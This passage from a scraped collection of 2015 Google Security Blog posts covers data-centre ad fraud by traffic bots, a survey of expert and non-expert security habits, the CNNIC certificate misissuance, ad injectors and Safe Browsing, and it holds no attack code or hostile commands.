advertisers this error would have been very large.  Below is a plot that shows how much click-through rates in May would have been inflated across the most impacted of DoubleClick Campaign Manager’s larger advertisers.   Two examples of bad data-center traffic  There are two distinct types of invalid data-center traffic: where the intent is malicious and where the impact on advertisers is accidental. In this section we consider two interesting examples where we’ve observed traffic that was likely generated with malicious intent.  Publishers use many different strategies to increase the traffic to their sites. Unfortunately, some are willing to use any means necessary to do so. In our investigations we’ve seen instances where publishers have been running software tools in data centers to intentionally mislead advertisers with fake impressions and fake clicks.  First example  UrlSpirit is just one example of software that some unscrupulous publishers have been using to collaboratively drive automated traffic to their websites. Participating publishers install the UrlSpirit application on Windows machines and they each submit up to three URLs through the application’s interface. Submitted URLs are then distributed to other installed instances of the application, where Internet Explorer is used to automatically visit the list of target URLs. Publishers who have not installed the application can also leverage the network of installations by paying a fee.  At the end of May more than 82% of the UrlSpirit installations were being run on machines in data centers. There were more than 6,500 data-center installations of UrlSpirit, with each data-center installation running in a separate virtual machine. In aggregate, the data-center installations of UrlSpirit were generating a monthly rate of at least half a billion ad requests— an average of 2,500 fraudulent ad requests per installation per day.  Second example  HitLeap is another example of software that some publishers are using to collaboratively drive automated traffic to their websites. The software also runs on Windows machines, and each instance uses the Chromium Embedded Framework to automatically browse the websites of participating publishers—rather than using Internet Explorer.  Before publishers can use the network of installations to drive traffic to their websites, they need browsing minutes. Participating publishers earn browsing minutes by running the application on their computers. Alternatively, they can simply buy browsing minutes—with bundles starting at $9 for 10,000 minutes or up to 1,000,000 minutes for $625.  Publishers can specify as many target URLs as they like. The number of visits they receive from the network of installations is a function of how long they want the network of bots to spend on their sites. For example, ten browsing minutes will get a publisher five visits if the publisher requests two-minute visit durations.  In mid-June, at least 4,800 HitLeap installations were being run in virtual machines in data centers, with a unique IP associated with each HitLeap installation. The data-center installations of HitLeap made up 16% of the total HitLeap network, which was substantially larger than the UrlSpirit network.   In aggregate, the data-center installations of HitLeap were generating a monthly rate of at least a billion fraudulent ad requests—or an average of 1,600 ad requests per installation per day.   Not only were these publishers collectively responsible for billions of automated ad requests, but their websites were also often extremely deceptive. For example, of the top ten webpages visited by HitLeap bots in June, nine of these included hidden ad slots -- meaning that not only was the traffic fake, but the ads couldn’t have been seen even if they had been legitimate human visitors.  http://vedgre.com/7/gg.html is illustrative of these nine webpages with hidden ad slots. The webpage has no visible content other than a single 300×250px ad. This visible ad is actually in a 300×250px iframe that includes two ads, the second of which is hidden. Additionally, there are also twenty-seven 0×0px hidden iframes on this page with each hidden iframe including two ad slots. In total there are fifty-five hidden ads on this page and one visible ad. Finally, the ads served on http://vedgre.com/7/gg.html appear to advertisers as though they have been served on legitimate websites like indiatimes.com, scotsman.com, autotrader.co.uk, allrecipes.com, dictionary.com and nypost.com, because the tags used on http://vedgre.com/7/gg.html to request the ad creatives have been deliberately spoofed.  An example of collateral damage  Unlike the traffic described above, there is also automated data-center traffic that impacts advertising campaigns but that hasn’t been generated for malicious purposes. An interesting example of this is an advertising competitive intelligence company that is generating a large volume of undeclared non-human traffic.  This company uses bots to scrape the web to find out which ad creatives are being served on which websites and at what scale. The company’s scrapers also click ad creatives to analyse the landing page destinations. To provide its clients with the most accurate possible intelligence, this company’s scrapers operate at extraordinary scale and they also do so without including bot identifiers in their User-Agent strings.  While the aim of this company is not to cause advertisers to pay for fake traffic, the company’s scrapers do waste advertiser spend. They not only generate non-human impressions; they also distort the metrics that advertisers use to evaluate campaign performance—in particular, click metrics. Looking at the data across DoubleClick Campaign Manager this company’s scrapers were responsible for 65% of the automated data-center clicks recorded in the month of May.  Going forward  Google has always invested to prevent this and other types of invalid traffic from entering our ad platforms. By contributing our data-center blacklist to TAG, we hope to help others in the industry protect themselves.  We’re excited by the collaborative spirit we’ve seen working with other industry leaders on this initiative. This is an important, early step toward tackling fraudulent and illegitimate inventory across the industry and we look forward to sharing more in the future. By pooling our collective efforts and working with industry bodies, we can create strong defenses against those looking to take advantage of our ecosystem. We look forward to working with the TAG Anti-fraud working group to turn this pilot program into an industry-wide tool.     ", "date": "July 21, 2015"},
{"website": "Google-Security", "title": "\nNew research: Comparing how security experts and non-experts stay safe online\n", "author": ["Posted by "], "link": "https://security.googleblog.com/2015/07/new-research-comparing-how-security.html", "abstract": "                             Posted by&nbsp;   Iulia Ion, Software Engineer - Rob Reeder, Research Scientist - Sunny Consolvo, User Experience Researcher    Today, you can find more online security tips in a few seconds than you could use in a lifetime. While this collection of best practices is rich, it&#8217;s not always useful; it can be difficult to know which ones to prioritize, and why.    Questions like &#8216;Why do people make some security choices (and not others)?&#8217; and &#8216;How effectively does the security community communicate its best practices?&#8217; are at the heart of a new paper called,&nbsp;&#8220;...no one can hack my mind&#8221;: Comparing Expert and Non-Expert Security Practices&#8221; that we&#8217;ll present this week at the  Symposium on Usable Privacy and Security .    This paper outlines the results of two surveys&#8212;one with 231 security experts, and another with 294 web-users who aren&#8217;t security experts&#8212;in which we asked both groups what they do to stay safe online. We wanted to compare and contrast responses from the two groups, and better understand differences and why they may exist.     Experts&#8217; and non-experts&#8217; top 5 security practices     Here are experts&#8217; and non-experts&#8217; top security practices, according to our study. We asked each participant to list 3 practices:          Common ground: careful password management            Clearly, careful password management is a priority for both groups. But, they differ on their approaches.         Security experts rely heavily on password managers, services that store and protect all of a user&#8217;s passwords in one place. Experts reported using password managers, for at least some of their accounts, three-times more frequently than non-experts.    As one expert said, &#8220;Password managers change the whole calculus because they make it possible to have both strong and unique passwords.&#8221;           On the other hand, only 24% of non-experts reported using password managers for at least some of their accounts, compared to 73% of experts. Our findings suggested this was due to lack of education about the benefits of password managers and/or a perceived lack of trust in these programs. &#8220;I try to remember my passwords because no one can hack my mind,&#8221; one non-expert told us.              Key differences: software updates and antivirus software          Despite some overlap, experts&#8217; and non-experts&#8217; top answers were remarkably different.         35% of experts and only 2% of non-experts said that installing software updates was one of their top security practices. Experts recognize the benefits of updates&#8212;&#8220;Patch, patch, patch,&#8221; said one expert&#8212;while non-experts not only aren&#8217;t clear on them, but are concerned about the potential risks of software updates. A non-expert told us: &#8220;I don&#8217;t know if updating software is always safe. What [if] you download malicious software?&#8221; and &#8220;Automatic software updates are not safe in my opinion, since it can be abused to update malicious content.&#8221;         Meanwhile, 42% of non-experts vs. only 7% of experts said that running antivirus software was one of the top three three things they do to stay safe online. Experts acknowledged the benefits of antivirus software, but expressed concern that it might give users a false sense of security since it&#8217;s not a bulletproof solution.              Next Steps          In the immediate term, we encourage everyone to read the  full research paper , borrow experts&#8217; top practices, and also check out our tips for  keeping your information safe on Google .         More broadly, our findings highlight fundamental misunderstandings about basic online security practices. Software updates, for example, are the seatbelts of online security; they make you safer, period. And yet, many non-experts not only overlook these as a best practice, but also mistakenly worry that software updates are a security risk.         No practice on either list&#8212;expert or non-expert&#8212;makes users less secure. But, there is clearly room to improve how security best practices are prioritized and communicated to the vast majority of (non expert) users. We&#8217;re looking forward to tackling that challenge.                                     Posted by  Iulia Ion, Software Engineer - Rob Reeder, Research Scientist - Sunny Consolvo, User Experience Researcher  Today, you can find more online security tips in a few seconds than you could use in a lifetime. While this collection of best practices is rich, it’s not always useful; it can be difficult to know which ones to prioritize, and why.  Questions like ‘Why do people make some security choices (and not others)?’ and ‘How effectively does the security community communicate its best practices?’ are at the heart of a new paper called, “...no one can hack my mind”: Comparing Expert and Non-Expert Security Practices” that we’ll present this week at the Symposium on Usable Privacy and Security.  This paper outlines the results of two surveys—one with 231 security experts, and another with 294 web-users who aren’t security experts—in which we asked both groups what they do to stay safe online. We wanted to compare and contrast responses from the two groups, and better understand differences and why they may exist.  Experts’ and non-experts’ top 5 security practices  Here are experts’ and non-experts’ top security practices, according to our study. We asked each participant to list 3 practices:   Common ground: careful password management     Clearly, careful password management is a priority for both groups. But, they differ on their approaches.    Security experts rely heavily on password managers, services that store and protect all of a user’s passwords in one place. Experts reported using password managers, for at least some of their accounts, three-times more frequently than non-experts.  As one expert said, “Password managers change the whole calculus because they make it possible to have both strong and unique passwords.”     On the other hand, only 24% of non-experts reported using password managers for at least some of their accounts, compared to 73% of experts. Our findings suggested this was due to lack of education about the benefits of password managers and/or a perceived lack of trust in these programs. “I try to remember my passwords because no one can hack my mind,” one non-expert told us.     Key differences: software updates and antivirus software    Despite some overlap, experts’ and non-experts’ top answers were remarkably different.    35% of experts and only 2% of non-experts said that installing software updates was one of their top security practices. Experts recognize the benefits of updates—“Patch, patch, patch,” said one expert—while non-experts not only aren’t clear on them, but are concerned about the potential risks of software updates. A non-expert told us: “I don’t know if updating software is always safe. What [if] you download malicious software?” and “Automatic software updates are not safe in my opinion, since it can be abused to update malicious content.”    Meanwhile, 42% of non-experts vs. only 7% of experts said that running antivirus software was one of the top three three things they do to stay safe online. Experts acknowledged the benefits of antivirus software, but expressed concern that it might give users a false sense of security since it’s not a bulletproof solution.     Next Steps    In the immediate term, we encourage everyone to read the full research paper, borrow experts’ top practices, and also check out our tips for keeping your information safe on Google.    More broadly, our findings highlight fundamental misunderstandings about basic online security practices. Software updates, for example, are the seatbelts of online security; they make you safer, period. And yet, many non-experts not only overlook these as a best practice, but also mistakenly worry that software updates are a security risk.    No practice on either list—expert or non-expert—makes users less secure. But, there is clearly room to improve how security best practices are prioritized and communicated to the vast majority of (non expert) users. We’re looking forward to tackling that challenge.     ", "date": "July 23, 2015"},
{"website": "Google-Security", "title": "\nMaintaining digital certificate security\n", "author": ["Posted by Adam Langley, Security Engineer ", "On Friday, March 20th, we became aware of unauthorized digital certificates for several Google domains. The certificates were issued by an intermediate certificate authority apparently held by a company called ", ". This intermediate certificate was issued by ", ". ", "CNNIC is included in all major root stores and so the misissued certificates would be trusted by almost all browsers and operating systems. Chrome on Windows, OS X, and Linux, ChromeOS, and Firefox 33 and greater would have rejected these certificates because of ", ", although misissued certificates for other sites likely exist.", "We promptly alerted CNNIC and other major browsers about the incident, and we blocked the MCS Holdings certificate in Chrome with a ", " push. CNNIC responded on the 22nd to explain that they had contracted with MCS Holdings on the basis that MCS would only issue certificates for domains that they had registered. However, rather than keep the private key in a suitable ", ", MCS installed it in a man-in-the-middle proxy. These devices intercept secure connections by masquerading as the intended destination and are sometimes used by companies to intercept their employees’ secure traffic for monitoring or legal reasons. The employees’ computers normally have to be configured to trust a proxy for it to be able to do this. However, in this case, the presumed proxy was given the full authority of a public CA, which is a serious breach of the CA system. This situation is similar to ", " in 2013.", "This explanation is congruent with the facts. However, CNNIC still delegated their substantial authority to an organization that was not fit to hold it. ", "Chrome users do not need to take any action to be protected by the CRLSet updates. We have no indication of abuse and we are not suggesting that people change passwords or take other action. At this time we are considering what further actions are appropriate.", "This event also highlights, again, that the ", " effort is critical for protecting the security of certificates in the future.", "(Details of the certificate chain for software vendors can be found ", ".)", ": As a result of a joint investigation of the events surrounding this incident by Google and CNNIC, we have decided that the CNNIC Root and EV CAs will no longer be recognized in Google products. This will take effect in a future Chrome update. To assist customers affected by this decision, for a limited time we will allow CNNIC’s existing certificates to continue to be marked as trusted in Chrome, through the use of a publicly disclosed whitelist. While neither we nor CNNIC believe any further unauthorized digital certificates have been issued, nor do we believe the misissued certificates were used outside the limited scope of MCS Holdings’ test network, CNNIC will be working to prevent any future incidents. CNNIC will implement Certificate Transparency for all of their certificates prior to any request for reinclusion. We applaud CNNIC on their proactive steps, and welcome them to reapply once suitable technical and procedural controls are in place."], "link": "https://security.googleblog.com/2015/03/maintaining-digital-certificate-security.html", "abstract": "                             Posted by Adam Langley, Security Engineer&nbsp;        On Friday, March 20th, we became aware of unauthorized digital certificates for several Google domains. The certificates were issued by an intermediate certificate authority apparently held by a company called  MCS Holdings . This intermediate certificate was issued by  CNNIC .&nbsp;        CNNIC is included in all major root stores and so the misissued certificates would be trusted by almost all browsers and operating systems. Chrome on Windows, OS X, and Linux, ChromeOS, and Firefox 33 and greater would have rejected these certificates because of  public-key pinning , although misissued certificates for other sites likely exist.        We promptly alerted CNNIC and other major browsers about the incident, and we blocked the MCS Holdings certificate in Chrome with a  CRLSet  push. CNNIC responded on the 22nd to explain that they had contracted with MCS Holdings on the basis that MCS would only issue certificates for domains that they had registered. However, rather than keep the private key in a suitable  HSM , MCS installed it in a man-in-the-middle proxy. These devices intercept secure connections by masquerading as the intended destination and are sometimes used by companies to intercept their employees&#8217; secure traffic for monitoring or legal reasons. The employees&#8217; computers normally have to be configured to trust a proxy for it to be able to do this. However, in this case, the presumed proxy was given the full authority of a public CA, which is a serious breach of the CA system. This situation is similar to  a failure by ANSSI  in 2013.        This explanation is congruent with the facts. However, CNNIC still delegated their substantial authority to an organization that was not fit to hold it.&nbsp;        Chrome users do not need to take any action to be protected by the CRLSet updates. We have no indication of abuse and we are not suggesting that people change passwords or take other action. At this time we are considering what further actions are appropriate.        This event also highlights, again, that the  Certificate Transparency  effort is critical for protecting the security of certificates in the future.        (Details of the certificate chain for software vendors can be found  here .)         Update - April 1 : As a result of a joint investigation of the events surrounding this incident by Google and CNNIC, we have decided that the CNNIC Root and EV CAs will no longer be recognized in Google products. This will take effect in a future Chrome update. To assist customers affected by this decision, for a limited time we will allow CNNIC&#8217;s existing certificates to continue to be marked as trusted in Chrome, through the use of a publicly disclosed whitelist. While neither we nor CNNIC believe any further unauthorized digital certificates have been issued, nor do we believe the misissued certificates were used outside the limited scope of MCS Holdings&#8217; test network, CNNIC will be working to prevent any future incidents. CNNIC will implement Certificate Transparency for all of their certificates prior to any request for reinclusion. We applaud CNNIC on their proactive steps, and welcome them to reapply once suitable technical and procedural controls are in place.                                    Posted by Adam Langley, Security Engineer   On Friday, March 20th, we became aware of unauthorized digital certificates for several Google domains. The certificates were issued by an intermediate certificate authority apparently held by a company called MCS Holdings. This intermediate certificate was issued by CNNIC.   CNNIC is included in all major root stores and so the misissued certificates would be trusted by almost all browsers and operating systems. Chrome on Windows, OS X, and Linux, ChromeOS, and Firefox 33 and greater would have rejected these certificates because of public-key pinning, although misissued certificates for other sites likely exist.  We promptly alerted CNNIC and other major browsers about the incident, and we blocked the MCS Holdings certificate in Chrome with a CRLSet push. CNNIC responded on the 22nd to explain that they had contracted with MCS Holdings on the basis that MCS would only issue certificates for domains that they had registered. However, rather than keep the private key in a suitable HSM, MCS installed it in a man-in-the-middle proxy. These devices intercept secure connections by masquerading as the intended destination and are sometimes used by companies to intercept their employees’ secure traffic for monitoring or legal reasons. The employees’ computers normally have to be configured to trust a proxy for it to be able to do this. However, in this case, the presumed proxy was given the full authority of a public CA, which is a serious breach of the CA system. This situation is similar to a failure by ANSSI in 2013.  This explanation is congruent with the facts. However, CNNIC still delegated their substantial authority to an organization that was not fit to hold it.   Chrome users do not need to take any action to be protected by the CRLSet updates. We have no indication of abuse and we are not suggesting that people change passwords or take other action. At this time we are considering what further actions are appropriate.  This event also highlights, again, that the Certificate Transparency effort is critical for protecting the security of certificates in the future.  (Details of the certificate chain for software vendors can be found here.)  Update - April 1: As a result of a joint investigation of the events surrounding this incident by Google and CNNIC, we have decided that the CNNIC Root and EV CAs will no longer be recognized in Google products. This will take effect in a future Chrome update. To assist customers affected by this decision, for a limited time we will allow CNNIC’s existing certificates to continue to be marked as trusted in Chrome, through the use of a publicly disclosed whitelist. While neither we nor CNNIC believe any further unauthorized digital certificates have been issued, nor do we believe the misissued certificates were used outside the limited scope of MCS Holdings’ test network, CNNIC will be working to prevent any future incidents. CNNIC will implement Certificate Transparency for all of their certificates prior to any request for reinclusion. We applaud CNNIC on their proactive steps, and welcome them to reapply once suitable technical and procedural controls are in place.     ", "date": "March 23, 2015"},
{"website": "Google-Security", "title": "\nOut with unwanted ad injectors\n", "author": ["Posted by Nav Jagpal, Software Engineer, Safe Browsing"], "link": "https://security.googleblog.com/2015/03/out-with-unwanted-ad-injectors.html", "abstract": "                             Posted by Nav Jagpal, Software Engineer, Safe Browsing     It&#8217;s tough to read the New York Times under these circumstances:           And it&#8217;s pretty unpleasant to shop for a Nexus 6 on a search results page that looks like this:             The browsers in the screenshots above have been infected with &#8216;ad injectors&#8217;. Ad injectors are programs that insert new ads, or replace existing ones, into the pages you visit while browsing the web. We&#8217;ve received more than 100,000 complaints from Chrome users about ad injection since the beginning of 2015&#8212;more than network errors, performance problems, or any other issue.&nbsp;         Injectors are yet another symptom of &#8220; unwanted software &#8221;&#8212;programs that are deceptive, difficult to remove, secretly bundled with other downloads, and have other bad qualities. We&#8217;ve made  several   recent  announcements about our work to fight unwanted software via  Safe Browsing , and now we&#8217;re sharing some updates on our efforts to protect you from injectors as well.&nbsp;          Unwanted ad injectors: disliked by users, advertisers, and publishers          Unwanted ad injectors aren&#8217;t part of a healthy ads ecosystem. They&#8217;re part of an environment where bad practices hurt users, advertisers, and publishers alike.&nbsp;         People don&#8217;t like ad injectors for several reasons: not only are they intrusive, but people are often tricked into installing ad injectors in the first place, via deceptive advertising, or software &#8220;bundles.&#8221; Ad injection can also be a security risk, as the  recent &#8220;Superfish&#8221; incident  showed.&nbsp;         But, ad injectors are problematic for advertisers and publishers as well. Advertisers often don&#8217;t know their ads are being injected, which means they don&#8217;t have any idea where their ads are running. Publishers, meanwhile, aren&#8217;t being compensated for these ads, and more importantly, they unknowingly may be putting their visitors in harm&#8217;s way, via spam or malware in the injected ads.&nbsp;          How Google fights unwanted ad injectors          We have a variety of policies that either limit, or entirely prohibit, ad injectors.&nbsp;         In Chrome, any extension hosted in the Chrome Web Store must comply with the  Developer Program Policies . These require that extensions have a  narrow and easy-to-understand purpose . We don&#8217;t ban injectors altogether&#8212;if they want to, people can still choose to install injectors that clearly disclose what they do&#8212;but injectors that sneak ads into a user&#8217;s browser would certainly violate our policies. We show people familiar red warnings when they are about to download software that is deceptive, or doesn&#8217;t use the right APIs to interact with browsers.             On the ads side,  AdWords advertisers  with software downloads hosted on their site, or linked to from their site, must comply with our  Unwanted Software Policy . Additionally, both  Google Platforms program policies  and the  DoubleClick Ad Exchange (AdX) Seller Program Guidelines , don&#8217;t allow programs that overlay ad space on a given site without permission of the site owner.         To increase awareness about ad injectors and the scale of this issue, we&#8217;ll be releasing new research on May 1 that examines the ad injector ecosystem in depth. The study, conducted with researchers at University of California Berkeley, drew conclusions from more than 100 million pageviews of Google sites across Chrome, Firefox, and Internet Explorer on various operating systems, globally. It&#8217;s not a pretty picture. Here&#8217;s a sample of the findings:         Ad injectors were detected on all operating systems (Mac and Windows), and web browsers (Chrome, Firefox, IE) that were included in our test.   More than 5% of people visiting Google sites have at least one ad injector installed. Within that group, half have at least two injectors installed and nearly one-third have at least four installed.   Thirty-four percent of Chrome extensions injecting ads were classified as outright malware.   Researchers found 192 deceptive Chrome extensions that affected 14 million users; these have since been disabled. Google now incorporates the techniques researchers used to catch these extensions to scan all new and updated extensions.         We&#8217;re constantly working to improve our product policies to protect people online. We encourage others to do the same. We&#8217;re committed to continuing to improve this experience for Google and the web as a whole.                                          Posted by Nav Jagpal, Software Engineer, Safe Browsing  It’s tough to read the New York Times under these circumstances:   And it’s pretty unpleasant to shop for a Nexus 6 on a search results page that looks like this:    The browsers in the screenshots above have been infected with ‘ad injectors’. Ad injectors are programs that insert new ads, or replace existing ones, into the pages you visit while browsing the web. We’ve received more than 100,000 complaints from Chrome users about ad injection since the beginning of 2015—more than network errors, performance problems, or any other issue.     Injectors are yet another symptom of “unwanted software”—programs that are deceptive, difficult to remove, secretly bundled with other downloads, and have other bad qualities. We’ve made several recent announcements about our work to fight unwanted software via Safe Browsing, and now we’re sharing some updates on our efforts to protect you from injectors as well.     Unwanted ad injectors: disliked by users, advertisers, and publishers    Unwanted ad injectors aren’t part of a healthy ads ecosystem. They’re part of an environment where bad practices hurt users, advertisers, and publishers alike.     People don’t like ad injectors for several reasons: not only are they intrusive, but people are often tricked into installing ad injectors in the first place, via deceptive advertising, or software “bundles.” Ad injection can also be a security risk, as the recent “Superfish” incident showed.     But, ad injectors are problematic for advertisers and publishers as well. Advertisers often don’t know their ads are being injected, which means they don’t have any idea where their ads are running. Publishers, meanwhile, aren’t being compensated for these ads, and more importantly, they unknowingly may be putting their visitors in harm’s way, via spam or malware in the injected ads.     How Google fights unwanted ad injectors    We have a variety of policies that either limit, or entirely prohibit, ad injectors.     In Chrome, any extension hosted in the Chrome Web Store must comply with the Developer Program Policies. These require that extensions have a narrow and easy-to-understand purpose. We don’t ban injectors altogether—if they want to, people can still choose to install injectors that clearly disclose what they do—but injectors that sneak ads into a user’s browser would certainly violate our policies. We show people familiar red warnings when they are about to download software that is deceptive, or doesn’t use the right APIs to interact with browsers.    On the ads side, AdWords advertisers with software downloads hosted on their site, or linked to from their site, must comply with our Unwanted Software Policy. Additionally, both Google Platforms program policies and the DoubleClick Ad Exchange (AdX) Seller Program Guidelines, don’t allow programs that overlay ad space on a given site without permission of the site owner.    To increase awareness about ad injectors and the scale of this issue, we’ll be releasing new research on May 1 that examines the ad injector ecosystem in depth. The study, conducted with researchers at University of California Berkeley, drew conclusions from more than 100 million pageviews of Google sites across Chrome, Firefox, and Internet Explorer on various operating systems, globally. It’s not a pretty picture. Here’s a sample of the findings:    Ad injectors were detected on all operating systems (Mac and Windows), and web browsers (Chrome, Firefox, IE) that were included in our test. More than 5% of people visiting Google sites have at least one ad injector installed. Within that group, half have at least two injectors installed and nearly one-third have at least four installed. Thirty-four percent of Chrome extensions injecting ads were classified as outright malware. Researchers found 192 deceptive Chrome extensions that affected 14 million users; these have since been disabled. Google now incorporates the techniques researchers used to catch these extensions to scan all new and updated extensions.    We’re constantly working to improve our product policies to protect people online. We encourage others to do the same. We’re committed to continuing to improve this experience for Google and the web as a whole.      ", "date": "March 31, 2015"},
{"website": "Google-Security", "title": "\nEven more unwanted software protection via the Safe Browsing API\n", "author": ["Posted by Emily Schechter, Safe Browsing Program Manager"], "link": "https://security.googleblog.com/2015/03/even-more-unwanted-software-protection.html", "abstract": "                             Posted by Emily Schechter, Safe Browsing Program Manager     Deceptive software disguised as a useful download harms your web experience by making undesired changes to your computer. Safe Browsing offers protection from such  unwanted software  by showing a warning in Chrome before you download these programs. In  February  we started showing additional warnings in Chrome before you visit a site that encourages downloads of unwanted software.    Today, we&#8217;re adding information about unwanted software to our  Safe Browsing API .           In addition to our constantly-updated malware and phishing data, our unwanted software data is now publicly available for developers to integrate into their own security measures. For example, any app that wants to save its users from winding up on sites that lead to deceptive software could use our API to do precisely that.    We continue to integrate Safe Browsing technology across Google&#8212;in  Chrome ,  Google Analytics , and more&#8212;to protect users. Our Safe Browsing API helps extend our malware, phishing, and unwanted software protection to keep more than 1.1 billion users safe online.    Check out our updated API documentation  here .                                   Posted by Emily Schechter, Safe Browsing Program Manager  Deceptive software disguised as a useful download harms your web experience by making undesired changes to your computer. Safe Browsing offers protection from such unwanted software by showing a warning in Chrome before you download these programs. In February we started showing additional warnings in Chrome before you visit a site that encourages downloads of unwanted software.  Today, we’re adding information about unwanted software to our Safe Browsing API.   In addition to our constantly-updated malware and phishing data, our unwanted software data is now publicly available for developers to integrate into their own security measures. For example, any app that wants to save its users from winding up on sites that lead to deceptive software could use our API to do precisely that.  We continue to integrate Safe Browsing technology across Google—in Chrome, Google Analytics, and more—to protect users. Our Safe Browsing API helps extend our malware, phishing, and unwanted software protection to keep more than 1.1 billion users safe online.  Check out our updated API documentation here.     ", "date": "March 24, 2015"},
{"website": "Google-Security", "title": "\nAndroid Security State of the Union 2014\n", "author": ["Posted by Adrian Ludwig, Lead Engineer for Android Security"], "link": "https://security.googleblog.com/2015/04/android-security-state-of-union-2014.html", "abstract": "                             Posted by Adrian Ludwig, Lead Engineer for Android Security     We&#8217;re committed to making Android a safe ecosystem for users and developers. That&#8217;s why we built Android the way we did&#8212;with multiple layers of security in the platform itself and in the services Google provides. In addition to traditional protections like encryption and application sandboxes, these layers use both automated and manual review systems to keep the ecosystem safe from malware, phishing scams, fraud, and spam every day.    Android offers an application-focused platform security model rooted in a strong application sandbox. We also use data to improve security in near real time through a combination of reliable products and trusted services, like Google Play, and Verify Apps. And, because we are an open platform, third-party research and reports help make us stronger and users safer.    But, every now and then we like to check in to see how we&#8217;re doing. So, we&#8217;ve been working hard on a  report  that analyzes billions (!) of data points gathered every day during 2014 and provides comprehensive and in-depth insight into security of the Android ecosystem. We hope this will help us share our approaches and data-driven decisions with the security community in order to keep users safer and avoid risk.    It&#8217;s lengthy, so if you&#8217;ve only got a minute, we pulled out a few of the key findings here:     Over 1 billion devices are protected with Google Play which conducts 200 million security scans of devices per day.   Fewer than 1% of Android devices had a Potentially Harmful App (PHA) installed in 2014. Fewer than 0.15% of devices that only install from Google Play had a PHA installed.   The overall worldwide rate of Potentially Harmful Application (PHA) installs decreased by nearly 50% between Q1 and Q4 2014.   SafetyNet checks over 400 million connections per day for potential SSL issues.   Android and Android partners responded to 79 externally reported security issues, and over 25,000 applications in Google Play were updated following security notifications from Google Play.           We want to ensure that Android is a safe place, and this report has helped us take a look at how we did in the past year, and what we can still improve on. In 2015, we have already  announced  that we are being even more proactive in reviewing applications for all types of policy violations within Google Play. Outside of Google Play, we have also increased our efforts to enhance protections for specific higher-risk devices and regions.         As always, we are appreciate feedback on our report and suggestions for how we can improve Android. Contact us at  security@android.com .                                     Posted by Adrian Ludwig, Lead Engineer for Android Security  We’re committed to making Android a safe ecosystem for users and developers. That’s why we built Android the way we did—with multiple layers of security in the platform itself and in the services Google provides. In addition to traditional protections like encryption and application sandboxes, these layers use both automated and manual review systems to keep the ecosystem safe from malware, phishing scams, fraud, and spam every day.  Android offers an application-focused platform security model rooted in a strong application sandbox. We also use data to improve security in near real time through a combination of reliable products and trusted services, like Google Play, and Verify Apps. And, because we are an open platform, third-party research and reports help make us stronger and users safer.  But, every now and then we like to check in to see how we’re doing. So, we’ve been working hard on a report that analyzes billions (!) of data points gathered every day during 2014 and provides comprehensive and in-depth insight into security of the Android ecosystem. We hope this will help us share our approaches and data-driven decisions with the security community in order to keep users safer and avoid risk.  It’s lengthy, so if you’ve only got a minute, we pulled out a few of the key findings here:  Over 1 billion devices are protected with Google Play which conducts 200 million security scans of devices per day. Fewer than 1% of Android devices had a Potentially Harmful App (PHA) installed in 2014. Fewer than 0.15% of devices that only install from Google Play had a PHA installed. The overall worldwide rate of Potentially Harmful Application (PHA) installs decreased by nearly 50% between Q1 and Q4 2014. SafetyNet checks over 400 million connections per day for potential SSL issues. Android and Android partners responded to 79 externally reported security issues, and over 25,000 applications in Google Play were updated following security notifications from Google Play.     We want to ensure that Android is a safe place, and this report has helped us take a look at how we did in the past year, and what we can still improve on. In 2015, we have already announced that we are being even more proactive in reviewing applications for all types of policy violations within Google Play. Outside of Google Play, we have also increased our efforts to enhance protections for specific higher-risk devices and regions.    As always, we are appreciate feedback on our report and suggestions for how we can improve Android. Contact us at security@android.com.     ", "date": "April 2, 2015"},
{"website": "Google-Security", "title": "\nBeyond annoyance: security risks of unwanted ad injectors\n", "author": ["Posted by Eric Severance, Software Engineer, Safe Browsing "], "link": "https://security.googleblog.com/2015/04/beyond-annoyance-security-risks-of.html", "abstract": "                             Posted by Eric Severance, Software Engineer, Safe Browsing&nbsp;     Last month, we posted about  unwanted ad injectors , a common side-effect of installing unwanted software. Ad injectors are often annoying, but in some cases, they can jeopardize users&#8217; security as well. Today, we want to shed more light on how ad injector software can hijack even encrypted SSL browser communications.     How ad injectors jeopardize security     In the example below, the ad injector software tampers with the security trust store that your browser uses to establish a secure connection with your Gmail. This can give the injector access to your personal data and make your computer vulnerable to a 'man in the middle' attack.                SSL hijacking is completely invisible to users because hijacked browser sessions appear like any other secure browser session. The screenshot on the left shows a normal connection to Gmail, the one on the right shows the difference when a SSL hijacker is installed.      You may recall the recent SuperFish/Komodia incident.  As has been reported , the Komodia SSL hijacker did not properly verify secure connections and it was not using keys in a secure way. This type of software puts users at additional risk by making it possible for remote attackers to impersonate web sites and expose users&#8217; private data.     How to stay safe      Safe Browsing  protects users from several classes of unwanted software that expose users to such risk. However, it never hurts to remain cautious when downloading software or browsing the web. When you are visiting a secure site, like your email or online banking site, pay extra attention to any unusual changes to the site&#8217;s content. If you notice unusual changes, like extra ads, coupons, or surveys, this may be an indication that your computer is infected with this type of unwanted software. Please, also check out  these tips  to learn how you can stay safe on the web.    For software developers, if your software makes changes to the content of web sites, the safest way to make those changes is through a browser extension. This keeps users&#8217; communications secure by relying on the browser&#8217;s security guarantees. Software that attempts to change browser behavior or content by any other means may be flagged as  unwanted software .                                         Posted by Eric Severance, Software Engineer, Safe Browsing   Last month, we posted about unwanted ad injectors, a common side-effect of installing unwanted software. Ad injectors are often annoying, but in some cases, they can jeopardize users’ security as well. Today, we want to shed more light on how ad injector software can hijack even encrypted SSL browser communications.  How ad injectors jeopardize security  In the example below, the ad injector software tampers with the security trust store that your browser uses to establish a secure connection with your Gmail. This can give the injector access to your personal data and make your computer vulnerable to a 'man in the middle' attack.    SSL hijacking is completely invisible to users because hijacked browser sessions appear like any other secure browser session. The screenshot on the left shows a normal connection to Gmail, the one on the right shows the difference when a SSL hijacker is installed.  You may recall the recent SuperFish/Komodia incident. As has been reported, the Komodia SSL hijacker did not properly verify secure connections and it was not using keys in a secure way. This type of software puts users at additional risk by making it possible for remote attackers to impersonate web sites and expose users’ private data.  How to stay safe  Safe Browsing protects users from several classes of unwanted software that expose users to such risk. However, it never hurts to remain cautious when downloading software or browsing the web. When you are visiting a secure site, like your email or online banking site, pay extra attention to any unusual changes to the site’s content. If you notice unusual changes, like extra ads, coupons, or surveys, this may be an indication that your computer is infected with this type of unwanted software. Please, also check out these tips to learn how you can stay safe on the web.  For software developers, if your software makes changes to the content of web sites, the safest way to make those changes is through a browser extension. This keeps users’ communications secure by relying on the browser’s security guarantees. Software that attempts to change browser behavior or content by any other means may be flagged as unwanted software.      ", "date": "April 16, 2015"},
